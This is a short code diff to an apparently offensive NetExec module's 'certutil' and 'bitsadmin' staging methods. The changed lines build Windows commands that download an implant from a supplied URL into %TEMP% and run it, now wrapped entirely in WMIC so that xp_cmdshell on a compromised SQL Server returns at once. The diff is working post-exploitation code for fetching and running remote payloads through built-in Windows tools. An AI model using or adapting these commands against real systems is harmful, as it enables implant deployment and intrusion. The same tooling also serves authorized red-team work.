@@ -1367,21 +1367,21 @@ class NXCModule:
             elif self.staging_method == "certutil":
                 # Certutil download + execute with WMIC for true async
                 # WMIC process call create is fire-and-forget - returns immediately
-                # This prevents xp_cmdshell from blocking for 2+ minutes
+                # Entire download+execute chain is wrapped in WMIC to prevent xp_cmdshell blocking
                 cmd = (
-                    f'cmd /c certutil -urlcache -f {download_url} '
-                    f'%TEMP%\\{implant_name} && '
-                    f'WMIC process call create "%TEMP%\\{implant_name}"'
+                    f'WMIC process call create '
+                    f'"cmd /c certutil -urlcache -f {download_url} '
+                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
                 )
                 context.log.debug(f"Using certutil staging method")
             elif self.staging_method == "bitsadmin":
                 # BITSAdmin download + execute with WMIC for true async
                 # WMIC process call create is fire-and-forget - returns immediately
-                # This prevents xp_cmdshell from blocking for 2+ minutes
+                # Entire download+execute chain is wrapped in WMIC to prevent xp_cmdshell blocking
                 cmd = (
-                    f'cmd /c bitsadmin /transfer job /download /priority high '
-                    f'{download_url} %TEMP%\\{implant_name} && '
-                    f'WMIC process call create "%TEMP%\\{implant_name}"'
+                    f'WMIC process call create '
+                    f'"cmd /c bitsadmin /transfer job /download /priority high '
+                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
                 )
                 context.log.debug(f"Using bitsadmin staging method")
             else:
